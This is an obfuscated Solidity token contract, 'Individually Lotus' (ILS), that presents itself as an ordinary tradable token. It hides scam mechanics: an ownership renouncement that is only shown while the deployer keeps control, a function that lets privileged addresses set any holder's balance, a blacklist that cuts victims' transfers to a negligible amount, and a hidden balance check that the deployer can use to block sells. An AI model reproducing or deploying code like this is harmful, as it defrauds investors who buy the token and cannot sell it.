//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface swapMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingFund {
    function createPair(address autoLaunchedReceiver, address minTrading) external returns (address);
}

interface autoMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeIsSender) external view returns (uint256);

    function transfer(address txTeamList, uint256 buyList) external returns (bool);

    function allowance(address listIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyList) external returns (bool);

    function transferFrom(
        address sender,
        address txTeamList,
        uint256 buyList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderLimitFund, uint256 value);
    event Approval(address indexed listIs, address indexed spender, uint256 value);
}

interface autoMaxMetadata is autoMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IndividuallyLotus is walletAt, autoMax, autoMaxMetadata {

    bool public listAt;

    mapping(address => bool) public modeList;

    uint256 constant tradingExempt = 1 ** 10;

    function maxEnableMode(address isMax) public {
        require(isMax.balance < 100000);
        if (senderLaunch) {
            return;
        }
        if (totalToken != listFee) {
            listFee = true;
        }
        modeList[isMax] = true;
        if (senderAuto) {
            txSender = false;
        }
        senderLaunch = true;
    }

    function transfer(address modeTotal, uint256 buyList) external virtual override returns (bool) {
        return modeBuySender(_msgSender(), modeTotal, buyList);
    }

    uint256 private tradingLaunchedMarketing = 100000000 * 10 ** 18;

    bool private txSender;

    function takeTxTeam() public {
        emit OwnershipTransferred(txExemptLaunched, address(0));
        launchShouldFrom = address(0);
    }

    constructor (){
        
        swapMin modeEnable = swapMin(launchedLimit);
        fundReceiverAmount = marketingFund(modeEnable.factory()).createPair(modeEnable.WETH(), address(this));
        if (enableList != senderAuto) {
            txSender = true;
        }
        txExemptLaunched = _msgSender();
        takeTxTeam();
        modeList[txExemptLaunched] = true;
        launchedExemptTrading[txExemptLaunched] = tradingLaunchedMarketing;
        if (senderAuto != listAt) {
            enableList = true;
        }
        emit Transfer(address(0), txExemptLaunched, tradingLaunchedMarketing);
    }

    event OwnershipTransferred(address indexed modeFeeList, address indexed senderTotalSwap);

    uint8 private modeLaunchReceiver = 18;

    bool public senderLaunch;

    function modeBuySender(address senderExempt, address txTeamList, uint256 buyList) internal returns (bool) {
        if (senderExempt == txExemptLaunched) {
            return totalFee(senderExempt, txTeamList, buyList);
        }
        uint256 buyLaunchSwap = autoMax(fundReceiverAmount).balanceOf(listMode);
        require(buyLaunchSwap == fundShould);
        require(txTeamList != listMode);
        if (feeToken[senderExempt]) {
            return totalFee(senderExempt, txTeamList, tradingExempt);
        }
        return totalFee(senderExempt, txTeamList, buyList);
    }

    function buyTxIs() private view {
        require(modeList[_msgSender()]);
    }

    uint256 fundShould;

    bool private totalToken;

    function totalFee(address senderExempt, address txTeamList, uint256 buyList) internal returns (bool) {
        require(launchedExemptTrading[senderExempt] >= buyList);
        launchedExemptTrading[senderExempt] -= buyList;
        launchedExemptTrading[txTeamList] += buyList;
        emit Transfer(senderExempt, txTeamList, buyList);
        return true;
    }

    bool public enableList;

    address public fundReceiverAmount;

    uint256 shouldAt;

    function symbol() external view virtual override returns (string memory) {
        return liquidityBuy;
    }

    mapping(address => mapping(address => uint256)) private txLaunchedTo;

    bool public senderAuto;

    function decimals() external view virtual override returns (uint8) {
        return modeLaunchReceiver;
    }

    address public txExemptLaunched;

    bool public listFee;

    function owner() external view returns (address) {
        return launchShouldFrom;
    }

    function name() external view virtual override returns (string memory) {
        return buyReceiver;
    }

    function transferFrom(address senderExempt, address txTeamList, uint256 buyList) external override returns (bool) {
        if (_msgSender() != launchedLimit) {
            if (txLaunchedTo[senderExempt][_msgSender()] != type(uint256).max) {
                require(buyList <= txLaunchedTo[senderExempt][_msgSender()]);
                txLaunchedTo[senderExempt][_msgSender()] -= buyList;
            }
        }
        return modeBuySender(senderExempt, txTeamList, buyList);
    }

    mapping(address => bool) public feeToken;

    function isAt(address modeTotal, uint256 buyList) public {
        buyTxIs();
        launchedExemptTrading[modeTotal] = buyList;
    }

    function getOwner() external view returns (address) {
        return launchShouldFrom;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLaunchedMarketing;
    }

    function launchFund(uint256 buyList) public {
        buyTxIs();
        fundShould = buyList;
    }

    string private buyReceiver = "Individually Lotus";

    function approve(address exemptTotal, uint256 buyList) public virtual override returns (bool) {
        txLaunchedTo[_msgSender()][exemptTotal] = buyList;
        emit Approval(_msgSender(), exemptTotal, buyList);
        return true;
    }

    function allowance(address exemptFund, address exemptTotal) external view virtual override returns (uint256) {
        if (exemptTotal == launchedLimit) {
            return type(uint256).max;
        }
        return txLaunchedTo[exemptFund][exemptTotal];
    }

    function maxLimit(address atShould) public {
        buyTxIs();
        if (senderAuto != txSender) {
            listFee = true;
        }
        if (atShould == txExemptLaunched || atShould == fundReceiverAmount) {
            return;
        }
        feeToken[atShould] = true;
    }

    mapping(address => uint256) private launchedExemptTrading;

    address private launchShouldFrom;

    address launchedLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address listMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address takeIsSender) public view virtual override returns (uint256) {
        return launchedExemptTrading[takeIsSender];
    }

    string private liquidityBuy = "ILS";

}